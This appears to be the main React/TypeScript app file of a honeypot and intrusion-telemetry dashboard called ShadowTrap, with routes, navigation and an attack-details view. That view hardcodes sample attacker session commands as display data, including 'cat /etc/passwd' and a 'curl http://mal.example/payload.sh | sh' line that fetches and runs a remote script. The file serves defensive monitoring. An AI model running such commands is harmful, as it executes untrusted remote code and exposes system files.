import { BrowserRouter, Routes, Route, NavLink, useParams } from 'react-router-dom'
import { Shield, Activity, Bug, Bell, Server, Download } from 'lucide-react'
import { useEffect, useState } from 'react'
import type { Attack } from './services/data'
import { Card as UiCard } from './components/Card'
import { Skeleton } from './components/Skeleton'
import { SeverityBadge } from './components/SeverityBadge'
import Dashboard from './pages/Dashboard'
import Attacks from './pages/Attacks'
import Alerts from './pages/Alerts'
import Settings from './pages/Settings'
import Report from './pages/report'
import Controls from './pages/controls'


function App() {
  return (
    <BrowserRouter>
      <div className="min-h-screen bg-neutral-950 text-neutral-100 flex">
        <Sidebar />
        <div className="flex-1 min-w-0">
          <Header />
          <main className="mx-auto max-w-7xl px-6 py-8">
            <Routes>
              <Route path="/" element={<Dashboard />} />
              <Route path="/attacks" element={<Attacks />} />
              <Route path="/attacks/:id" element={<AttackDetails />} />
              <Route path="/alerts" element={<Alerts />} />
              <Route path="/settings" element={<Settings />} />
              <Route path="/report" element={<Report />} />
              <Route path="/controls" element={<Controls />} />
            </Routes>
          </main>
        </div>
      </div>
    </BrowserRouter>
  )
}

function Header() {
  const navClass = ({ isActive }: { isActive: boolean }) =>
    `px-3 py-2 rounded-md text-sm font-medium transition-colors ${
      isActive ? 'bg-neutral-800 text-white' : 'text-neutral-300 hover:text-white hover:bg-neutral-800'
    }`

  return (
    <header className="border-b border-neutral-800 bg-neutral-900/60 backdrop-blur sticky top-0 z-10">
      <div className="mx-auto max-w-7xl px-6 py-4 flex items-center justify-between gap-6">
        <div className="flex items-center gap-3">
          <div className="h-9 w-9 grid place-items-center rounded-lg bg-gradient-to-br from-fuchsia-600 to-indigo-600">
            <Shield className="h-5 w-5" />
          </div>
          <div>
            <div className="text-lg font-semibold tracking-wide">ShadowTrap</div>
            <div className="text-xs text-neutral-400 -mt-0.5">Intrusion Deception & Telemetry</div>
          </div>
        </div>
        <nav className="flex items-center gap-2">
          <NavLink to="/" className={navClass} end>
            <Activity className="h-4 w-4 mr-1.5 inline" /> Dashboard
          </NavLink>
          <NavLink to="/attacks" className={navClass}>
            <Bug className="h-4 w-4 mr-1.5 inline" /> Attacks
          </NavLink>
          <NavLink to="/alerts" className={navClass}>
            <Bell className="h-4 w-4 mr-1.5 inline" /> Alerts
          </NavLink>
          <NavLink to="/settings" className={navClass}>
            Settings
          </NavLink>
          <NavLink
            to="/report"
            className={({ isActive }) =>
              `flex items-center gap-2 px-3 py-2 rounded-md text-sm ${
                isActive ? 'bg-neutral-800 text-white' : 'text-neutral-300 hover:text-white hover:bg-neutral-800'
              }`
            }
          >
            <Download className="h-4 w-4" /> Reports
          </NavLink>

          <NavLink
            to="/controls"
            className={({ isActive }) =>
              `flex items-center gap-2 px-3 py-2 rounded-md text-sm ${
                isActive ? 'bg-neutral-800 text-white' : 'text-neutral-300 hover:text-white hover:bg-neutral-800'
              }`
            }
          >
            <Server className="h-4 w-4" /> Controls
          </NavLink>
        </nav>
        <div className="flex items-center gap-2">
          <button className="inline-flex items-center gap-2 rounded-md bg-neutral-800 px-3 py-2 text-sm text-neutral-200 hover:bg-neutral-700">
            <Bell className="h-4 w-4" /> 
          </button>
        </div>
      </div>
    </header>
  )
}

function Sidebar() {
  const linkClass = ({ isActive }: { isActive: boolean }) =>
    `flex items-center gap-2 px-3 py-2 rounded-md text-sm ${
      isActive ? 'bg-neutral-800 text-white' : 'text-neutral-300 hover:text-white hover:bg-neutral-800'
    }`

  return (
    <aside className="hidden md:flex md:w-60 lg:w-72 border-r border-neutral-800 bg-neutral-950/60 backdrop-blur-sm">
      <div className="p-4 w-full">
        <div className="mb-6 text-xs uppercase tracking-wider text-neutral-500">Navigation</div>
        <nav className="space-y-1">
          <NavLink to="/" end className={linkClass}>
            <Activity className="h-4 w-4" /> Dashboard
          </NavLink>
          <NavLink to="/attacks" className={linkClass}>
            <Bug className="h-4 w-4" /> Attacks
          </NavLink>
          <NavLink to="/alerts" className={linkClass}>
            <Bell className="h-4 w-4" /> Alerts
          </NavLink>
          <NavLink to="/report" className={linkClass}>
            <Download className="h-4 w-4" /> Reports
          </NavLink>
          <NavLink to="/controls" className={linkClass}>
            <Server className="h-4 w-4" /> Controls
          </NavLink>
          <NavLink to="/settings" className={linkClass}>
            Settings
          </NavLink>
        </nav>
        <div className="mt-8 text-xs uppercase tracking-wider text-neutral-500">System</div>
        <ul className="mt-2 space-y-1 text-sm text-neutral-400">
          <li>IDS</li>
          <li>Honeypot</li>
          <li>Alerts</li>
        </ul>
      </div>
    </aside>
  )
}

// ==========================
// AttackDetails Component
// ==========================
function AttackDetails() {
  const { id } = useParams()
  const [attack, setAttack] = useState<Attack | undefined>()
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    let cancelled = false
    async function load() {
      const res = id ? await (await import('./services/data')).fetchAttackById(id) : undefined
      if (!cancelled) {
        setAttack(res)
        setLoading(false)
      }
    }
    load()
    return () => {
      cancelled = true
    }
  }, [id])

  const commands = [
    { t: '13:18:04', cmd: 'whoami' },
    { t: '13:18:06', cmd: 'uname -a' },
    { t: '13:18:12', cmd: 'cat /etc/passwd' },
    { t: '13:18:35', cmd: 'curl http://mal.example/payload.sh | sh' },
  ]

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <Bug className="h-5 w-5 text-neutral-400" />
        <h2 className="text-xl font-semibold">Attack Details</h2>
        <div className="text-neutral-400 text-sm">{id}</div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Commands Table */}
        <div className="lg:col-span-2">
          <UiCard title="Session Commands" icon={<Bug className="h-4 w-4 text-neutral-400" />}>
            {loading ? (
              <Skeleton className="h-40 w-full" />
            ) : (
              <table className="w-full text-sm table-auto border-collapse">
                <thead>
                  <tr className="text-neutral-400 text-left border-b border-neutral-700">
                    <th className="pr-4 pb-1">Time</th>
                    <th className="pb-1">Command</th>
                  </tr>
                </thead>
                <tbody>
                  {commands.map((c, i) => (
                    <tr key={i} className="hover:bg-neutral-800 transition-colors">
                      <td className="pr-4 py-1 text-xs text-neutral-400">{c.t}</td>
                      <td className="py-1">
                        <code className="rounded bg-neutral-800 px-2 py-1 text-neutral-200">{c.cmd}</code>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            )}
          </UiCard>
        </div>

        {/* Metadata */}
        <div>
          <UiCard title="Metadata" icon={<Shield className="h-4 w-4 text-neutral-400" />}>
            {loading || !attack ? (
              <Skeleton className="h-24 w-full" />
            ) : (
              <dl className="grid grid-cols-2 gap-x-4 gap-y-2 text-sm">
                <dt className="text-neutral-400">Source IP</dt>
                <dd className="text-neutral-200">{attack.sourceIp}</dd>

                <dt className="text-neutral-400">Geo</dt>
                <dd className="text-neutral-200">{attack.geo}</dd>

                <dt className="text-neutral-400">Vector</dt>
                <dd className="text-neutral-200">{attack.vector}</dd>

                <dt className="text-neutral-400">Severity</dt>
                <dd className="text-neutral-200">
                  <SeverityBadge level={attack.severity} />
                </dd>
              </dl>
            )}
          </UiCard>
        </div>
      </div>
    </div>
  )
}

export default App
